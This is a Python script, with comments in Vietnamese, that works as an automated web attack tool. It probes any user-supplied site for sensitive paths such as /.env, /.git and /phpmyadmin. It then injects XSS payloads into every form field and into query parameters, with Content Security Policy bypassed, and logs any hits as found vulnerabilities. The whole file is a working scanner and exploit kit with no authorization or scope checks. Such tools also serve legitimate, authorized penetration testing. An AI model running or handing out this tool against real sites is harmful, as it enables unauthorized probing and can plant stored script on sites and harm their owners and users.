import time
import signal
import sys
import logging
import requests
from playwright.sync_api import sync_playwright, Playwright
from playwright._impl._errors import TimeoutError

# Thiết lập logging
logging.basicConfig(filename='scan.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Danh sách payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<script>alert('XSS')</script>",
    "<svg/onload=alert('XSS')>", "<img src=x onerror=alert('XSS')>",
    "test@example.com<script>alert(1)</script>", "test@example.com\" onmouseover=\"alert(1)",
    "javascript:alert('XSS')@example.com"
]

# Common paths
COMMON_PATHS = [
    "/login", "/login.php", "/admin", "/admin.php", "/dashboard", "/auth", "/signin",
    "/user/login", "/adminpanel", "/controlpanel", "/secure", "/administrator",
    "/wp-login.php", "/wp-admin", "/wp-content", "/phpmyadmin", "/pma", "/config.php",
    "/.env", "/.git", "/api", "/api/v1", "/uploads", "/upload", "/files", "/media",
    "/robots.txt", "/sitemap.xml", "/admin-console", "/webdav"
]

# Biến toàn cục
stop_scanning = False
results_found = []
alert_triggered = False

# Xử lý Ctrl+C
def signal_handler(sig, frame):
    global stop_scanning
    print("\n[!] Stopping scan...")
    stop_scanning = True
    if results_found:
        with open("scan_results.txt", "a") as f:
            for result in results_found:
                f.write(result + "\n")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Hàm quét path ban đầu với Playwright
def scan_initial_paths(target):
    valid_paths = []
    print(f"\n[*] Scanning initial paths on {target}...")
    
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(headless=True)
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()

        # Lấy nội dung mặc định từ trang chính trước
        try:
            page.goto(target, timeout=10000)
            default_content = page.content()
            print(f"[*] Default content loaded from {target}")
        except TimeoutError:
            print(f"[!] Timeout loading default content from {target}")
            default_content = ""
            browser.close()
            return valid_paths

        # Kiểm tra từng path
        for path in COMMON_PATHS:
            full_url = f"{target.rstrip('/')}{path}"
            try:
                page.goto(full_url, timeout=10000)
                content = page.content()
                if content and (content != default_content or "form" in content.lower() or page.query_selector("form")):
                    print(f"[+] Found unique path: {path} - Status: {page.evaluate('() => document.readyState')}")
                    valid_paths.append(full_url)
                else:
                    print(f"[-] Default path: {path}")
            except TimeoutError:
                print(f"[-] Timeout or inaccessible: {path}")
            except Exception as e:
                print(f"[-] Error on {path}: {e}")

        browser.close()
    return valid_paths

# Hàm kiểm tra XSS trên từng path
def exploit_xss(playwright: Playwright, url, xss_payload):
    global stop_scanning, alert_triggered
    browser = None
    try:
        browser = playwright.chromium.launch(headless=False)
        context = browser.new_context(ignore_https_errors=True, bypass_csp=True)
        page = context.new_page()

        # Xử lý dialog
        def handle_dialog(dialog):
            global alert_triggered
            if not alert_triggered:
                alert_triggered = True
                print(f"[*] Alert triggered: {dialog.message}")
                dialog.accept()
                page.evaluate("window.alert = () => {};")

        page.on("dialog", handle_dialog)

        # Truy cập URL
        print(f"[*] Visiting {url} to test XSS with {xss_payload}...")
        page.goto(url, timeout=60000)

        # Kiểm tra form
        forms = page.query_selector_all("form")
        if forms:
            print(f"[*] Found {len(forms)} forms on {url}. Injecting payload...")
            for form in forms:
                inputs = form.query_selector_all("input, textarea")
                if inputs:
                    for input_field in inputs:
                        input_name = input_field.get_attribute("name") or "unnamed"
                        input_type = input_field.get_attribute("type") or "text"
                        if input_type not in ["submit", "button"]:
                            if "email" in input_name.lower() or input_type == "email":
                                payload = f"test@example.com{xss_payload}" if "@" not in xss_payload else xss_payload
                            else:
                                payload = xss_payload if "text" in input_type else "test"
                            page.fill(f"[name='{input_name}']", payload)

                    # Submit form
                    submit_button = form.query_selector("input[type='submit'], button[type='submit'], button")
                    if submit_button:
                        submit_button.click()
                    else:
                        page.evaluate("document.forms[0].submit()")
                    time.sleep(2)

                    if xss_payload in page.content():
                        result = f"[!!!] Stored XSS found with {xss_payload} at {url}"
                        print(result)
                        results_found.append(result)
                        logging.info(result)
                        return True

        # Kiểm tra Reflected XSS qua params
        page.goto(f"{url}?q={xss_payload}&search={xss_payload}&email={xss_payload}")
        time.sleep(2)
        if xss_payload in page.content():
            result = f"[!!!] Reflected XSS found with {xss_payload} at {url}"
            print(result)
            results_found.append(result)
            logging.info(result)
            return True

        return alert_triggered

    except Exception as e:
        print(f"[!] Error on {url}: {e}")
        return False
    finally:
        if browser:
            browser.close()

# Hàm quét tự động
def auto_exploit(target, paths, payloads, max_time=600):
    global stop_scanning
    start_time = time.time()
    print(f"\n[*] Starting XSS scan on {target} (Max time: {max_time}s)...")

    with sync_playwright() as playwright:
        for path in paths:
            if stop_scanning or time.time() - start_time > max_time:
                break
            print(f"\n[*] Testing path: {path}")
            for payload in payloads:
                if stop_scanning or time.time() - start_time > max_time:
                    break
                if exploit_xss(playwright, path, payload):
                    break

    if results_found:
        with open("scan_results.txt", "a") as f:
            for result in results_found:
                f.write(result + "\n")

# Menu chính
def scan_xss_and_continue():
    global stop_scanning, alert_triggered
    while True:
        stop_scanning = False
        alert_triggered = False
        results_found.clear()

        target_url = input("Enter target URL to scan for XSS (e.g., https://example.com/): ")
        valid_paths = scan_initial_paths(target_url)
        
        if valid_paths:
            print(f"\n[*] Found {len(valid_paths)} valid paths. Starting XSS scan...")
            auto_exploit(target_url, valid_paths, XSS_PAYLOADS)
        else:
            print("[!] No unique or restricted paths found. XSS scan skipped.")

        print("\nScan completed!")
        print("1. Scan another URL\n2. Exit")
        choice = input("Choice (1 or 2): ")
        if choice != "1":
            print("[*] Exiting...")
            sys.exit(0)

if __name__ == "__main__":
    scan_xss_and_continue()